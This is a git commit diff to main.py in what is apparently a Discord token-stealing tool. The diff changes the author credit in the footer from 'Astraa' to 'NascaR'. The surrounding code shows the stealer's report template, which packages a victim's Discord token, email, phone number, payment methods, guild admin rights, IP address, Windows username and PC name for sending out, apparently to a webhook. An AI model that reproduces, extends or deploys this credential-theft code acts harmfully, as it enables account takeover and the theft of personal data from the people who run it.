91788092cba27df21ff06779298f267c86a92a69
_ℕ𝕒𝕤𝕔𝕒ℝ_ <133878831+KAMIXlevrai@users.noreply.github.com>
2025-11-07 20:42:13 +0100

    Update main.py

--- main.py
+++ main.py
@@ -191,7 +191,7 @@ def main():
                                 ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                             'color': 3092790,
                             'footer': {
-                                'text': "Made by Astraa ・ https://github.com/astraadev"
+                                'text': "Made by NascaR ・ https://kamixlevrai.github.io/LikePageGunLoL/"
                             },
                             'thumbnail': {
                                 'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
